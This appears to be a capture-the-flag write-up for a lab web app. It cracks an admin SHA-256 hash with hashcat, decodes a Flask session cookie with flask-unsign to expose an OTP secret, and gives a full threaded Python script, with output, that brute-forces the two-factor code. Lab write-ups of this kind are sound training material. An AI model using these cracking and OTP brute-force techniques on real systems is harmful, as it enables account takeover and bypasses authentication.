@@ -1,0 +1,150 @@
+From users.db:
+
+We find the hash of the admin user in the database
+
+Inspecting the code we get to know that it is sha-256 hash encoded
+
+We will use hashcat to decode it and find the password using the supplied wordlist:
+
+$hashcat -m 1400 c20fa16907343eef642d10f0bdb81bf629e6aaf6c906f26eabda079ca9e5ab67 /usr/share/wordlists/rockyou.txt
+
+The password is apple@123 as shown here:
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+c20fa16907343eef642d10f0bdb81bf629e6aaf6c906f26eabda079ca9e5ab67:apple@123
+
+Next, we login as user admin and password apple@123 and obtain the session cookie.
+
+Now we decode the session cookie using flask-unsign tool.
+
+└──╼ $flask-unsign --decode --cookie ".eJwty0sKgCAQANC7zFoip8jPZWLISQR_qK2iu9ei7YN3QyzeswMLJ8XOIKCMunc-Go8PF43qtxES90GpgpXKIKIx6zxtSqOWWsDVuWVK_CVyKWR4Xkd7HGw.atNCNA.h5fDThKa4wgfvcRVPWU3b5CZJtY"
+{'logged': 'false', 'otp_secret': '3827', 'otp_timestamp': 1792229940.6782818, 'username': 'admin'}
+
+We enter the secret and obtain the flag.
+
+We can also write a brute force script as follows if the otp is not revealed in the session cookie:
+
+The below script is made using AI. It grabs the session cookie after login and uses threads to brute force the OTPs since there is no lockout policy as far as we can interpret from the app.py code.
+
+import requests
+import concurrent.futures
+import threading
+
+BASE_URL = "http://xebec.cylabacademy.net:32518"
+
+# ---- Step 1: Log in ONCE, capture the session cookie ----
+print("[*] Logging in as admin...")
+s = requests.Session()
+r = s.post(f"{BASE_URL}/login", data={
+    "username": "admin",
+    "password": "apple@123"
+}, allow_redirects=False, timeout=10)
+
+cookie = s.cookies.get("session")
+print(f"[*] Login status: {r.status_code}")
+print(f"[*] Captured session cookie: {cookie}")
+
+if not cookie:
+    print("[-] No session cookie captured — check login response.")
+    print("--- response body ---")
+    print(r.text[:500])
+    raise SystemExit(1)
+
+# ---- Step 2: Brute-force with that cookie ----
+print("[*] Brute-forcing OTP with captured cookie...")
+
+found_flag = False
+found_otp = None
+found_lock = threading.Lock()
+print_lock = threading.Lock()
+tried = 0
+tried_lock = threading.Lock()
+
+
+def test_otp(code):
+    global found_flag, found_otp, tried
+
+    with found_lock:
+        if found_flag:
+            return None
+
+    otp = str(code)
+    try:
+        res = requests.post(
+            f"{BASE_URL}/two_fa",
+            data={"otp": otp},
+            cookies={"session": cookie},
+            allow_redirects=False,
+            timeout=5,
+        )
+
+        if res.status_code == 302:
+            with found_lock:
+                if found_flag:
+                    return None
+                found_flag = True
+                found_otp = otp
+
+            with print_lock:
+                print(f"\n[+] SUCCESS! Correct OTP found: {otp}")
+
+            new_cookie = res.cookies.get("session") or cookie
+            home = requests.get(
+                f"{BASE_URL}/",
+                cookies={"session": new_cookie},
+                timeout=10,
+            )
+            with print_lock:
+                print("\n--- FLAG RESPONSE ---")
+                print(home.text)
+            return otp
+
+        with tried_lock:
+            tried += 1
+            n = tried
+        with print_lock:
+            if n % 100 == 0:
+                print(f"[*] {n} OTPs tried, still searching...")
+        return None
+
+    except Exception:
+        with tried_lock:
+            tried += 1
+        return None
+
+
+executor = concurrent.futures.ThreadPoolExecutor(max_workers=30)
+try:
+    futures = [executor.submit(test_otp, code) for code in range(1000, 10000)]
+    for f in concurrent.futures.as_completed(futures):
+        if f.result():
+            executor.shutdown(wait=False, cancel_futures=True)
+            break
+finally:
+    executor.shutdown(wait=False, cancel_futures=True)
+
+print("\n========== SUMMARY ==========")
+if found_otp:
+    print(f"[+] Correct OTP: {found_otp}")
+else:
+    print(f"[-] No OTP worked. Total tried: {tried}")
+
+Here is the output:
+└──╼ $python3 -u print_lol.py
+[*] Logging in as admin...
+[*] Login status: 302
+[*] Captured session cookie: .eJwty0sKgCAQANC7zFoih8T0MiE5ieAPnVbR3XPR9sF7INUQyIOFy6VBIKByOwadnXjiJlH_xjHTYJcbWKkNIhql1WKk3FeDAu5BvbhMMzmfY4H3A0WZHGA.atNAxw.MhR26nT72PjGnb0tExdF-ZPOCzI
+[*] Brute-forcing OTP with captured cookie...
+
+[*] 3000 OTPs tried, still searching...
+[*] 3100 OTPs tried, still searching...
+
+[+] SUCCESS! Correct OTP found: 4127
+
+--- FLAG RESPONSE ---
+...
